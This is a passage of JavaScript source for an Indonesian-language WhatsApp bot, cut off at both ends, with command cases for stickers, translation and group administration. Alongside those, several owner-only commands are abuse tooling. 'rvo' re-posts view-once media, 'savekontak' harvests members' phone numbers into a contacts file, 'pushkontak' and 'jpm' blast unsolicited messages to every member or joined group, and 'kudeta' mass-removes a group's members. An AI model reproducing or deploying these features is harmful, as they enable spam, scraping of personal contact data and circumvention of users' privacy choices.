exec(`ffmpeg -i ${inputPath} -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libwebp -lossless 1 -q:v 80 -preset default -an -vsync 0 ${outputPath}`, async (error) => {
if (error) {
console.error("Gagal mengonversi gambar:", error);
return await payreply("Gagal membuat stiker");
}
await vynx.sendMessage(m.chat, { 
sticker: fs.readFileSync(outputPath),
}, { quoted: m });
fs.unlinkSync(inputPath);
fs.unlinkSync(outputPath);
});
} catch (error) {
console.error("Gagal membuat stiker:", error);
await payreply("Gagal membuat stiker");
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "bratvid":  case "bratvideo": {
if (!text) return payreply(example('teksnya'))
try {
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await vynx.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await vynx.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await vynx.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await vynx.downloadAndSaveMediaMessage(qmsg)
await vynx.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await vynx.downloadAndSaveMediaMessage(qmsg)
await vynx.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return vynx.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return vynx.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return vynx.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await vynx.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'vynx.png');

let teks = directLink.toString()
await vynx.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await vynx.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'vynx.png');
let teks = directLink.toString()
await vynx.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "hd": {
if (!quoted) return payreply(`Balas gambar dengan caption ${prefix + command}`);
if (!/image/.test(mime)) return payreply(example("dengan kirim/reply foto"))
await vynx.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
try {
const { remini } = require("./library/hd.js");
let media = await quoted.download();
let enhanced = await remini(media, "enhance"); // Enhance pertama
enhanced = await remini(enhanced, "enhance"); // Enhance kedua
enhanced = await remini(enhanced, "enhance"); // Enhance ketiga    
vynx.sendFile(m.chat, enhanced, "", "_Sukses Membuat HD 3x Enhance✅_", m);
} catch (err) {
console.error(err);
await vynx.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
}
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "add": {
if (!m.isGroup) return payreply(mess.group)
if (!isCreator && !m.isAdmin) return payreply(mess.admin)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await vynx.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return payreply("Nomor tidak terdaftar di whatsapp")
const res = await vynx.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kick": case "kik": {
if (!m.isGroup) return payreply(mess.group)
if (!isCreator && !m.isAdmin) return payreply(mess.admin)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await vynx.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return payreply("Nomor tidak terdaftar di whatsapp")
const res = await vynx.groupParticipantsUpdate(m.chat, [input], 'remove')
await payreply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return payreply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator) return payreply(mess.owner)
if (!m.isGroup) return payreply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await vynx.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isCreator) return payreply(mess.owner)
if (!m.isGroup) return payreply(mess.group)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
await vynx.groupRevokeInvite(m.chat)
payreply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!m.isGroup) return payreply(mess.group)
if (!isCreator && !m.isAdmin) return payreply(mess.admin)
if (!text) return payreply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await vynx.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return payreply(mess.group)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await vynx.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await vynx.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ht": case "hidetag": {
if (!m.isGroup) return payreply(mess.group)
if (!isCreator && !m.isAdmin) return payreply(mess.admin)
if (!text) return payreply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await vynx.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingc": case "join": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return payreply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await vynx.groupAcceptInvite(result)
payreply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "get": case "g": {
if (!isCreator) return payreply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
payreply(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isCreator) return payreply(mess.owner)
if (!text && !m.quoted) return payreply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return payreply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await vynx.newsletterMetadata("invite", result)
await vynx.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoread": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return payreply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return payreply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return payreply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autopromosi": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return payreply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return payreply("Berhasil mematikan *autopromosi*")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return payreply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return payreply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return payreply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return payreply("Berhasil mematikan *autotyping*")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return payreply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return payreply("Berhasil mematikan *autoreadsw*")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return payreply(mess.group)
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return payreply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return payreply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return payreply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return payreply(mess.group)
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return payreply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return payreply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return payreply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return payreply("Berhasil mematikan *antilink* di grup ini")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink2": {
if (!m.isGroup) return payreply(mess.group)
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return payreply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return payreply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return payreply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return payreply("Berhasil mematikan *antilink2* di grup ini")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return payreply(mess.group)
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return payreply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return payreply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return payreply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return payreply("Berhasil mematikan *mute* di grup ini")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return payreply(mess.group)
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return payreply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return payreply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return payreply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return payreply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return payreply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return payreply(mess.group)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return payreply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await vynx.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await vynx.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kudetagc": case "kudeta": {
if (!isCreator) return payreply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return payreply("Grup Ini Sudah Tidak Ada Member!")
await payreply("Kudeta Grup By Vynx☠️")
for (let i of memberFilter) {
await vynx.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await payreply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return payreply(mess.group)
if (!m.isBotAdmin) return payreply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return payreply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await vynx.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await vynx.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return payreply(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addmurbug": {
if (!isCreator) return payreply(mess.owner)
if (!text && !m.quoted) return payreply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return payreply(`Nomor ${input2} sudah menjadi Murbug!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
payreply(`Berhasil menambah ${input2} ke Murbug`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listmurbug": {
if (premium.length < 1) return m.reply("Tidak ada user Murbug")
let teks = `\n *List Murbug Nika*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
vynx.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: lol})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delmurbug": {
if (!isCreator) return payreply(mess.owner)
if (!m.quoted && !text) return payreply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return payreply(`Dia Owner Anjg`)
if (!premium.includes(input)) return payreply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
payreply(`Berhasil menghapus ${input2} Dari Murbug Nika`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak": {
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("idgrupnya"))
let res = await vynx.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Depay - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await payreply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await vynx.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak2": {
if (!isOwner) return payreply(mess.owner)
if (!m.isGroup) return payreply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Depay - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await payreply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await vynx.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak": {
if (!isOwner) return payreply(mess.owner)
if (!text) return payreply(example("pesannya"))
const meta = await vynx.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return vynx.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `Shadow Death`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: lol}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await vynx.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await vynx.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await vynx.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak2": {
if (!isOwner) return payreply(mess.owner)
if (!m.isGroup) return payreply(mess.group)
if (!text) return payreply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await vynx.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await payreply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await vynx.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await vynx.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: lol})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslide": {
if (!isCreator) return payreply(mess.owner)
let allgrup = await vynx.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await payreply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await vynx.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: lol})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return payreply(mess.owner)
let allgrup = await vynx.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await payreply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await vynx.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: lol})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm": {
if (!isCreator) return payreply(mess.owner)
if (!q) return payreply(example("teksnya"))
let allgrup = await vynx.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await vynx.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await vynx.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: lol})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm2": {
if (!isCreator) return payreply(mess.owner)
if (!q) return payreply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return payreply(example("teks dengan mengirim foto"))
const allgrup = await vynx.groupFetchAllParticipating()
